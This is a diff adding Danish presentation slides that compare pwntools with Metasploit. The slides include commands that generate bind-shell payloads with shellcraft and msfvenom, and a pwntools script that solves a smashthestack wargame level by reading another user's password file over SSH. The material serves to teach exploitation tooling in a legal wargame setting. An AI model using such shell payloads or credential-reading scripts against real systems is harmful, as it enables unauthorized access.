@@ -1,0 +1,57 @@
+pwntools - Hvorfor ikke Metasploit?
+-----------------------------------
+
+[source,sh]
+------------------------------------------------
+vagrant@localhost:~$ time shellcraft -f r amd64.linux.bindsh 7777 >/dev/null
+ 
+ real    0m0.687s
+ user    0m0.241s
+ sys     0m0.320s
+vagrant@localhost:~$ time msfvenom -p linux/x64/shell_bind_tcp LPORT=7777 >/dev/null 2>&1
+
+ real    0m6.595s
+ user    0m1.928s
+ sys     0m4.146s
+------------------------------------------------
+
+pwntools - Hvorfor ikke Metasploit?
+-----------------------------------
+
+[source,sh]
+------------------------------------------------
+$ cat exploit.py 
+#!/usr/bin/env python2
+
+from pwn import *
+
+r = ssh('level1', 'io.smashthestack.org', password = 'level1')
+shell = r.shell()
+shell.sendlineafter('$ ', '/levels/level01')
+shell.sendlineafter(': ', '271')
+shell.sendlineafter('$ ', 'cat /home/level2/.pass')
+password = shell.recvuntil('$ ').split('\n')[1].strip()
+shell.close()
+shell.wait_for_close()
+log.info('level2 users password: %s' % password)
+$ ./exploit.py 
+[+] Connecting to io.smashthestack.org on port 22: Done
+[+] Opening new channel: None: Done
+[*] Closed SSH channel with io.smashthestack.org
+[*] level2 users password: XNWFtWKWHhaaXoKI
+$
+------------------------------------------------
+
+pwntools - Hvorfor ikke Metasploit?
+-----------------------------------
+
+[source,sh]
+------------------------------------------------
+vagrant@localhost:~$ find .repositories/metasploit-framework/modules/exploits/linux -name '*.rb' | xargs wc -l | sort -nr | tail -n 1
+    67 .repositories/metasploit-framework/modules/exploits/linux/http/peercast_url.rb
+------------------------------------------------
+
+pwntools
+--------
+
+Intro tid
